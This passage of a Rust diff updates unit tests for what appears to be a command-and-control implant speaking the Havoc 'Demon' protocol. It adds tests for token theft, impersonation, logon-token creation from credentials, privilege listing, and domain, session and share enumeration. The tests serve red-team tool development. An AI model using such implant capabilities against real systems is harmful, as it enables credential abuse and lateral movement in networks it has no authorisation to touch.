         let mut config = SpecterConfig::default();
         let package = net_package(DemonNetCommand::Domain, &[]);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         // After subcmd (4 bytes), read the LE length-prefixed domain string.
@@ -2385,7 +2861,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("SERVER01");
         let package = net_package(DemonNetCommand::Logons, &rest);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
@@ -2402,7 +2879,10 @@ mod tests {
         let mut config = SpecterConfig::default();
         // Subcommand only, no server name.
         let package = net_package(DemonNetCommand::Logons, &[]);
-        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
+        assert!(matches!(
+            dispatch(&package, &mut config, &mut TokenVault::new()),
+            DispatchResult::Ignore
+        ));
     }
 
     #[test]
@@ -2410,7 +2890,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("DC01");
         let package = net_package(DemonNetCommand::Sessions, &rest);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
@@ -2421,7 +2902,10 @@ mod tests {
     fn handle_net_sessions_missing_server_returns_ignore() {
         let mut config = SpecterConfig::default();
         let package = net_package(DemonNetCommand::Sessions, &[]);
-        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
+        assert!(matches!(
+            dispatch(&package, &mut config, &mut TokenVault::new()),
+            DispatchResult::Ignore
+        ));
     }
 
     #[test]
@@ -2429,7 +2913,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("CORP.LOCAL");
         let package = net_package(DemonNetCommand::Computer, &rest);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Computer));
@@ -2446,7 +2931,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("CORP.LOCAL");
         let package = net_package(DemonNetCommand::DcList, &rest);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::DcList));
@@ -2457,7 +2943,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("FILESERV");
         let package = net_package(DemonNetCommand::Share, &rest);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
@@ -2468,7 +2955,10 @@ mod tests {
     fn handle_net_share_missing_server_returns_ignore() {
         let mut config = SpecterConfig::default();
         let package = net_package(DemonNetCommand::Share, &[]);
-        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
+        assert!(matches!(
+            dispatch(&package, &mut config, &mut TokenVault::new()),
+            DispatchResult::Ignore
+        ));
     }
 
     #[test]
@@ -2476,7 +2966,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("WORKSTATION");
         let package = net_package(DemonNetCommand::LocalGroup, &rest);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::LocalGroup));
@@ -2491,7 +2982,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("localhost");
         let package = net_package(DemonNetCommand::LocalGroup, &rest);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         // On any Linux system /etc/group has at least "root".
@@ -2511,7 +3003,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("DC01");
         let package = net_package(DemonNetCommand::Group, &rest);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         assert_eq!(resp_subcmd_le(&resp.payload), u32::from(DemonNetCommand::Group));
@@ -2522,7 +3015,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("HOST01");
         let package = net_package(DemonNetCommand::Users, &rest);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandNet));
@@ -2534,7 +3028,8 @@ mod tests {
         let mut config = SpecterConfig::default();
         let rest = le_utf16le_net("localhost");
         let package = net_package(DemonNetCommand::Users, &rest);
-        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut TokenVault::new())
+        else {
             panic!("expected Respond");
         };
         // Parse response to find "root" with is_admin=true.
@@ -2568,6 +3063,333 @@ mod tests {
     fn handle_net_users_missing_server_returns_ignore() {
         let mut config = SpecterConfig::default();
         let package = net_package(DemonNetCommand::Users, &[]);
-        assert!(matches!(dispatch(&package, &mut config), DispatchResult::Ignore));
+        assert!(matches!(
+            dispatch(&package, &mut config, &mut TokenVault::new()),
+            DispatchResult::Ignore
+        ));
+    }
+
+    // ── CommandToken helpers ────────────────────────────────────────────────
+
+    /// Build a CommandToken package with the given subcommand and args.
+    fn token_package(subcmd: DemonTokenCommand, args: &[u8]) -> DemonPackage {
+        let mut payload = (u32::from(subcmd)).to_le_bytes().to_vec();
+        payload.extend_from_slice(args);
+        DemonPackage::new(DemonCommand::CommandToken, 1, payload)
+    }
+
+    // ── Token::Impersonate ──────────────────────────────────────────────────
+
+    #[test]
+    fn token_impersonate_nonexistent_returns_failure() {
+        let mut config = SpecterConfig::default();
+        let mut vault = TokenVault::new();
+        // Token ID 99 doesn't exist.
+        let args = 99u32.to_le_bytes().to_vec();
+        let package = token_package(DemonTokenCommand::Impersonate, &args);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandToken));
+        // Parse: [subcmd: u32][success: u32]
+        let mut off = 0;
+        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
+        assert_eq!(subcmd, u32::from(DemonTokenCommand::Impersonate));
+        let success = parse_u32_le(&resp.payload, &mut off).expect("success");
+        assert_eq!(success, 0); // FALSE — token not found
+    }
+
+    // ── Token::List ─────────────────────────────────────────────────────────
+
+    #[test]
+    fn token_list_empty_vault() {
+        let mut config = SpecterConfig::default();
+        let mut vault = TokenVault::new();
+        let package = token_package(DemonTokenCommand::List, &[]);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandToken));
+        // Only the subcmd header, no entries.
+        let mut off = 0;
+        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
+        assert_eq!(subcmd, u32::from(DemonTokenCommand::List));
+        assert_eq!(off, resp.payload.len()); // no more data
+    }
+
+    #[test]
+    fn token_list_with_entries() {
+        use crate::token::{TokenEntry, TokenType};
+
+        let mut config = SpecterConfig::default();
+        let mut vault = TokenVault::new();
+        vault.add(TokenEntry {
+            handle: 0xAA,
+            domain_user: "DOM\\user1".to_string(),
+            process_id: 100,
+            token_type: TokenType::Stolen,
+            credentials: None,
+        });
+        vault.add(TokenEntry {
+            handle: 0xBB,
+            domain_user: "DOM\\user2".to_string(),
+            process_id: 200,
+            token_type: TokenType::MakeNetwork,
+            credentials: None,
+        });
+
+        let package = token_package(DemonTokenCommand::List, &[]);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+            panic!("expected Respond");
+        };
+
+        let mut off = 0;
+        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
+        assert_eq!(subcmd, u32::from(DemonTokenCommand::List));
+
+        // Entry 0
+        let idx0 = parse_u32_le(&resp.payload, &mut off).expect("idx0");
+        assert_eq!(idx0, 0);
+        let handle0 = parse_u32_le(&resp.payload, &mut off).expect("handle0");
+        assert_eq!(handle0, 0xAA);
+        let user0_bytes = parse_bytes_le(&resp.payload, &mut off).expect("user0");
+        let user0 = decode_utf16le_null(&user0_bytes);
+        assert_eq!(user0, "DOM\\user1");
+        let pid0 = parse_u32_le(&resp.payload, &mut off).expect("pid0");
+        assert_eq!(pid0, 100);
+        let type0 = parse_u32_le(&resp.payload, &mut off).expect("type0");
+        assert_eq!(type0, TokenType::Stolen as u32);
+        let imp0 = parse_u32_le(&resp.payload, &mut off).expect("imp0");
+        assert_eq!(imp0, 0); // not impersonating
+
+        // Entry 1
+        let idx1 = parse_u32_le(&resp.payload, &mut off).expect("idx1");
+        assert_eq!(idx1, 1);
+        let _handle1 = parse_u32_le(&resp.payload, &mut off).expect("handle1");
+        let _user1_bytes = parse_bytes_le(&resp.payload, &mut off).expect("user1");
+        let pid1 = parse_u32_le(&resp.payload, &mut off).expect("pid1");
+        assert_eq!(pid1, 200);
+        let type1 = parse_u32_le(&resp.payload, &mut off).expect("type1");
+        assert_eq!(type1, TokenType::MakeNetwork as u32);
+    }
+
+    // ── Token::GetUid ───────────────────────────────────────────────────────
+
+    #[test]
+    fn token_getuid_returns_respond() {
+        let mut config = SpecterConfig::default();
+        let mut vault = TokenVault::new();
+        let package = token_package(DemonTokenCommand::GetUid, &[]);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandToken));
+        let mut off = 0;
+        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
+        assert_eq!(subcmd, u32::from(DemonTokenCommand::GetUid));
+        // elevated: u32
+        let _elevated = parse_u32_le(&resp.payload, &mut off).expect("elevated");
+        // user: wbytes (length-prefixed)
+        let user_bytes = parse_bytes_le(&resp.payload, &mut off).expect("user");
+        let user = decode_utf16le_null(&user_bytes);
+        assert!(!user.is_empty(), "user string should not be empty");
+    }
+
+    // ── Token::Revert ───────────────────────────────────────────────────────
+
+    #[test]
+    fn token_revert_returns_respond() {
+        let mut config = SpecterConfig::default();
+        let mut vault = TokenVault::new();
+        let package = token_package(DemonTokenCommand::Revert, &[]);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+            panic!("expected Respond");
+        };
+        let mut off = 0;
+        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
+        assert_eq!(subcmd, u32::from(DemonTokenCommand::Revert));
+        // On non-Windows: revert_to_self returns Err, so success = 0.
+        // On Windows: success depends on thread state.
+        let _success = parse_u32_le(&resp.payload, &mut off).expect("success");
+    }
+
+    // ── Token::Remove ───────────────────────────────────────────────────────
+
+    #[test]
+    fn token_remove_nonexistent_returns_failure() {
+        let mut config = SpecterConfig::default();
+        let mut vault = TokenVault::new();
+        let args = 42u32.to_le_bytes().to_vec();
+        let package = token_package(DemonTokenCommand::Remove, &args);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+            panic!("expected Respond");
+        };
+        let mut off = 0;
+        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
+        assert_eq!(subcmd, u32::from(DemonTokenCommand::Remove));
+        let success = parse_u32_le(&resp.payload, &mut off).expect("success");
+        assert_eq!(success, 0); // FALSE — no such token
+        let returned_id = parse_u32_le(&resp.payload, &mut off).expect("token_id");
+        assert_eq!(returned_id, 42);
+    }
+
+    #[test]
+    fn token_remove_existing_returns_success() {
+        use crate::token::{TokenEntry, TokenType};
+
+        let mut config = SpecterConfig::default();
+        let mut vault = TokenVault::new();
+        let id = vault.add(TokenEntry {
+            handle: 0,
+            domain_user: "D\\U".to_string(),
+            process_id: 1,
+            token_type: TokenType::Stolen,
+            credentials: None,
+        });
+
+        let args = id.to_le_bytes().to_vec();
+        let package = token_package(DemonTokenCommand::Remove, &args);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+            panic!("expected Respond");
+        };
+        let mut off = 0;
+        let _subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
+        let success = parse_u32_le(&resp.payload, &mut off).expect("success");
+        assert_eq!(success, 1); // TRUE
+        assert!(vault.get(id).is_none());
+    }
+
+    // ── Token::Clear ────────────────────────────────────────────────────────
+
+    #[test]
+    fn token_clear_empties_vault() {
+        use crate::token::{TokenEntry, TokenType};
+
+        let mut config = SpecterConfig::default();
+        let mut vault = TokenVault::new();
+        vault.add(TokenEntry {
+            handle: 0,
+            domain_user: "D\\U".to_string(),
+            process_id: 1,
+            token_type: TokenType::Stolen,
+            credentials: None,
+        });
+
+        let package = token_package(DemonTokenCommand::Clear, &[]);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+            panic!("expected Respond");
+        };
+        let mut off = 0;
+        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
+        assert_eq!(subcmd, u32::from(DemonTokenCommand::Clear));
+        assert!(vault.is_empty());
+    }
+
+    // ── Token::FindTokens ───────────────────────────────────────────────────
+
+    #[test]
+    fn token_find_returns_not_supported() {
+        let mut config = SpecterConfig::default();
+        let mut vault = TokenVault::new();
+        let package = token_package(DemonTokenCommand::FindTokens, &[]);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+            panic!("expected Respond");
+        };
+        let mut off = 0;
+        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
+        assert_eq!(subcmd, u32::from(DemonTokenCommand::FindTokens));
+        let success = parse_u32_le(&resp.payload, &mut off).expect("success");
+        assert_eq!(success, 0); // Not yet implemented
+    }
+
+    // ── Token::PrivsGetOrList ───────────────────────────────────────────────
+
+    #[test]
+    fn token_privs_list_returns_respond() {
+        let mut config = SpecterConfig::default();
+        let mut vault = TokenVault::new();
+        // list_privs = 1 (list mode)
+        let args = 1u32.to_le_bytes().to_vec();
+        let package = token_package(DemonTokenCommand::PrivsGetOrList, &args);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+            panic!("expected Respond");
+        };
+        let mut off = 0;
+        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
+        assert_eq!(subcmd, u32::from(DemonTokenCommand::PrivsGetOrList));
+        let list_flag = parse_u32_le(&resp.payload, &mut off).expect("list_privs");
+        assert_eq!(list_flag, 1);
+    }
+
+    // ── Token::Steal ────────────────────────────────────────────────────────
+
+    #[test]
+    fn token_steal_invalid_pid_returns_ignore() {
+        // On non-Windows, steal always fails; on Windows, PID 0 is invalid.
+        let mut config = SpecterConfig::default();
+        let mut vault = TokenVault::new();
+        let mut args = Vec::new();
+        args.extend_from_slice(&0u32.to_le_bytes()); // pid = 0
+        args.extend_from_slice(&0u32.to_le_bytes()); // handle = 0
+        let package = token_package(DemonTokenCommand::Steal, &args);
+        // On non-Windows stubs, steal returns Err → DispatchResult::Ignore.
+        let result = dispatch(&package, &mut config, &mut vault);
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    // ── Token::Make ─────────────────────────────────────────────────────────
+
+    #[test]
+    fn token_make_returns_respond_on_non_windows() {
+        let mut config = SpecterConfig::default();
+        let mut vault = TokenVault::new();
+
+        // Build args: [domain: wbytes][user: wbytes][password: wbytes][logon_type: u32]
+        let mut args = Vec::new();
+        let to_wbytes = |s: &str| -> Vec<u8> {
+            let utf16: Vec<u8> = s
+                .encode_utf16()
+                .chain(std::iter::once(0u16))
+                .flat_map(|c| c.to_le_bytes())
+                .collect();
+            let mut b = (utf16.len() as u32).to_le_bytes().to_vec();
+            b.extend_from_slice(&utf16);
+            b
+        };
+        args.extend_from_slice(&to_wbytes("DOMAIN"));
+        args.extend_from_slice(&to_wbytes("user"));
+        args.extend_from_slice(&to_wbytes("pass"));
+        args.extend_from_slice(&9u32.to_le_bytes()); // LOGON32_LOGON_NEW_CREDENTIALS
+
+        let package = token_package(DemonTokenCommand::Make, &args);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config, &mut vault) else {
+            panic!("expected Respond");
+        };
+        // On non-Windows: make_token fails, so response has subcmd but no domain_user.
+        let mut off = 0;
+        let subcmd = parse_u32_le(&resp.payload, &mut off).expect("subcmd");
+        assert_eq!(subcmd, u32::from(DemonTokenCommand::Make));
+        // Vault should remain empty on failure.
+        assert!(vault.is_empty());
+    }
+
+    // ── Token dispatch: unknown subcommand ──────────────────────────────────
+
+    #[test]
+    fn token_unknown_subcommand_returns_ignore() {
+        let mut config = SpecterConfig::default();
+        let mut vault = TokenVault::new();
+        // Subcommand 255 is not defined.
+        let payload = 255u32.to_le_bytes().to_vec();
+        let package = DemonPackage::new(DemonCommand::CommandToken, 1, payload);
+        assert!(matches!(dispatch(&package, &mut config, &mut vault), DispatchResult::Ignore));
+    }
+
+    #[test]
+    fn token_empty_payload_returns_ignore() {
+        let mut config = SpecterConfig::default();
+        let mut vault = TokenVault::new();
+        let package = DemonPackage::new(DemonCommand::CommandToken, 1, vec![]);
+        assert!(matches!(dispatch(&package, &mut config, &mut vault), DispatchResult::Ignore));
     }
 }
